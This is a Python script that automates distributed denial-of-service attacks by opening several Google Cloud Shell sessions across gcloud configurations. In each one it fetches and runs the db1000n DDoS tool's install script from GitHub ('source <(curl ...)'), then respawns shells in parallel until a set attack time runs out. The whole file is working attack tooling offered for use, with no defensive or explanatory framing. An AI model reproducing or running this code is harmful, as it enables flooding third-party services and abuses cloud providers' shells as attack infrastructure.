"""
attack with needles via gshells

"""

import argparse
import logging
import os
import shlex
import subprocess
import sys
import time

logging.getLogger().setLevel(logging.INFO)

ATTACK_COMMAND = (
    'gcloud cloud-shell ssh --authorize-session '
    '--command="source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) '
    '&& ./db1000n {}"'
)


class Attack:
    """
    class to attack with needles via gshells

    """

    def __init__(self):
        self.configurations = iter([])
        self.shells_num = 0
        self.processes = []

    def make_configurations(self, shells_num):
        """
        makes gcloud configurations

        :param shells_num: a number of gshells

        """
        process = subprocess.Popen(
            shlex.split('gcloud config configurations list'),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        configs = [
            x for x in process.stdout.readlines()[1:] if not x.startswith(b'default')
        ]
        if configs:
            configs = [
                x.split()[0].decode() for x in configs
            ]
            logging.info('gcloud configurations: %s', ", ".join(configs))

            self.configurations = iter(configs)
            self.shells_num = min(len(configs), shells_num)
        else:
            logging.warning('there is no gcloud configuration')

    def make_process(self, needles_args):
        """
        makes process with ssh connect to gshell and runs command

        :param needles_args: db1000n arguments

        """
        configuration = next(self.configurations, None)
        if configuration:
            os.makedirs('logs', exist_ok=True)
            with open(f'logs{os.sep}configuration_{configuration}.log', 'wb') as log:
                process = subprocess.Popen(
                    shlex.split(ATTACK_COMMAND.format(needles_args)),
                    env={
                        **dict(os.environ),
                        'CLOUDSDK_ACTIVE_CONFIG_NAME': configuration,
                    },
                    stdout=log,
                    stderr=log
                )
                logging.info(
                    'gcloud configuration %s: attack started, pid %d',
                    configuration,
                    process.pid
                )
                self.processes.append(process)

    def start(self, needles_args):
        """
        starts attack with needles via gshells

        :param needles_args: db1000n arguments

        """
        for _ in range(self.shells_num):
            self.make_process(needles_args)

        while self.processes:
            for process in self.processes:
                code = process.poll()

                if code is not None:
                    self.processes.remove(process)
                    logging.info('attack finished, pid %d, return code: %d', process.pid, code)

                if len(self.processes) < self.shells_num:
                    self.make_process(needles_args)

            time.sleep(5.)


def main():
    """
    attacks with needles via gshells

    """
    parser = argparse.ArgumentParser(
        description='auto-attack with needles via gshells in parallel',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('--attack_time', type=int, default=1, help='minimum attack time in seconds')
    parser.add_argument('--shells_num', type=int, default=4, help='number of gshells')
    parser.add_argument('--needles_args', type=str, default='', help='db1000n arguments')
    args = parser.parse_args()

    attack = Attack()
    start_time = time.time()

    try:
        logging.info('press ctrl+c to stop attack')
        while (time.time() - start_time) < args.attack_time:
            attack.make_configurations(args.shells_num)
            attack.start(args.needles_args)

    except KeyboardInterrupt:
        for process in attack.processes:
            process.terminate()

        logging.info('attack interrupted')
        sys.exit()


if __name__ == '__main__':
    main()
